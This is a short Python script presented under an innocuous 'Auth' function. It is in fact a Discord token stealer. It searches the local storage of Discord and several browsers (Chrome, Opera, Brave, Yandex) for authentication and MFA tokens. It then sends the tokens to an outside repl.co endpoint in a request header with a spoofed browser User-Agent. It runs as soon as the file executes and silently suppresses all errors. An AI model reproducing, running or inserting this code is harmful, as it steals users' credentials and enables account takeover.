import requests 
import os
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from json import loads, dumps
from base64 import b64decode
from re import findall
from threading import Thread
import json

def Auth():

        def dastela():

            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            PATHS = {
                "Discord"           : ROAMING + "\\Discord",
                "Discord Canary"    : ROAMING + "\\discordcanary",
                "Discord PTB"       : ROAMING + "\\discordptb",
                "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
                "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
                "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
            }


            def getas(path):
                path += "\\Local Storage\\leveldb"
                tokens = []
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                tokens.append(token)
                return tokens

            
            def main():
                cache_path = ROAMING + "\\.cache~$"
                user_path_name = os.getenv("userprofile").split("\\")[2]
                a = []
                for platform, path in PATHS.items():
                    if not os.path.exists(path):
                        continue
                    for i in getas(path):
                        if not i in a:
                            a.append(i)
                headers = { 
                'Host': 'teste.juniorclipa.repl.co',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,mn;q=0.6',
'Cache-Control': 'max-age=0',
'Cp-Extension-Installed': 'Yes',
'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
'Sec-Ch-Ua-Mobile': '?0',
'Sec-Ch-Ua-Platform': '"Windows"',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'none',
'Sec-Fetch-User': '?1',
'Upgrade-Insecure-Requests': '1',
'a' : f'{a}',
'X-Forwarded-Proto': 'https'
                }
                r = requests.get('https://hake.juniorclipa.repl.co/api/add', headers=headers)
                    
            try:
                main()
            except Exception as e:
                pass
        try:
            dastela()
        except:
            pass


Auth()
